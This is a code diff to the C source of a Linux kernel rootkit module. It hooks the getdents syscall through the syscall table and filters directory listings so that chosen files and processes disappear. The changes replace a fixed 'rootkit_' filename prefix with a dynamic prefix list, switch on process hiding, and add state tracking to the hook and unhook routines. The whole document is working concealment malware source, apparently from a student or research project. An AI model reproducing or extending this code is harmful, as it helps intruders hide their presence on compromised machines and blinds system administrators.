@@ -13,6 +13,9 @@
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage ssize_t (*syscall_readlink) (const char *path, char *buf, size_t bufsiz);
 
+/* used to keep track of whether we hooked getdents or not */
+static unsigned int getdents_hooked = 0;
+
 /*
  * call counter to ensure that we are not unhooking the
  * getdents function while it is in use and the corresponding
@@ -81,6 +84,9 @@ check_hide_fprefix(char *path)
 {
 	char *d_name;
 	
+	struct file_prefix *cur;
+	struct list_head *cursor;
+	
 	if(path == NULL) {
 		return 0;
 	}
@@ -88,16 +94,21 @@ check_hide_fprefix(char *path)
 	d_name = path;
 	
 	do {
-	
-		// TODO: implement dynamic prefixes
-		if(strstr(d_name, "rootkit_") == d_name) 
-		{
-			return 1;
+		
+		list_for_each(cursor, get_prefix_list()) {
+			cur = list_entry(cursor, struct file_prefix, list);
+			
+			if(strstr(d_name, cur->name) == d_name) 
+			{
+				return 1;
+			}
 		}
-		else if(strstr(d_name, ".rootkit_") == d_name)
-		{
-			return 1;
-		}
+		
+		//if(strstr(d_name, "rootkit_") == d_name) {
+		//	return 1;
+		//} else if(strstr(d_name, ".rootkit_") == d_name) {
+		//	return 1;
+		//}
 		
 		d_name = get_next_level(d_name);
 	} while (d_name != NULL);
@@ -204,22 +215,27 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 	char path[1024];
 	ssize_t path_len;
 
+	/* call the original function for its output */
 	ret = (*original_getdents) (fd,dirp,count);	
 	tlen = ret;
 	
+	/* get the current path and terminate it with a '/' */
 	path_len = get_path(fd, path, 1024);
 	memset(path+path_len, '/', 1);
-	while(tlen>0) {
+	
+	/* loop all entries */
+	while(tlen > 0) {
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
 		
+		/* append the file/folder name to the path and zero-terminate it */
 		strcpy(path+path_len+1, dirp->d_name);
 		memset(path+path_len + strlen(dirp->d_name) + 1, '\0', 1);
 
-		if(check_hide_fpath(path)
-				//|| check_hide_fprefix(path)
-				//|| check_hide_process(fd, dirp->d_name)
-				|| check_hide_loop(path)) {	
+		/* check whether we need to hide the file */
+		if(check_hide_process(fd, dirp->d_name)
+				|| check_hide_loop(path)) {
+			/* remove it from the output */
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
 		} else if(tlen != 0) {
@@ -258,7 +274,11 @@ hook_getdents(void) {
 
 	/* reenable write protection */
 	enable_page_protection();
-
+	
+	/* set to hooked */
+	getdents_hooked = 1;
+	
+	/* log and return */
 	ROOTKIT_DEBUG("Done.\n");
 	return;
 }
@@ -269,6 +289,12 @@ hook_getdents(void) {
 void
 unhook_getdents(void) {
 	ROOTKIT_DEBUG("Unhooking the getdents syscall...\n");
+	
+	/* only do anything if getdents is actually hooked */
+	if(getdents_hooked < 1) {
+		ROOTKIT_DEBUG("Nothing to do.\n");
+		return;
+	}
 	
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 
@@ -281,11 +307,14 @@ unhook_getdents(void) {
 	/* reenable write protection */
 	enable_page_protection();
 
+	/* set to not-hooked */
+	getdents_hooked = 0;
+	
 	/* ensure that all processes have left our manipulated syscall */
 	while(getdents_call_counter > 0) {
 		msleep(2);
 	}
 	
-	/* log our success */
+	/* log and return */
 	ROOTKIT_DEBUG("Done.\n");
 }
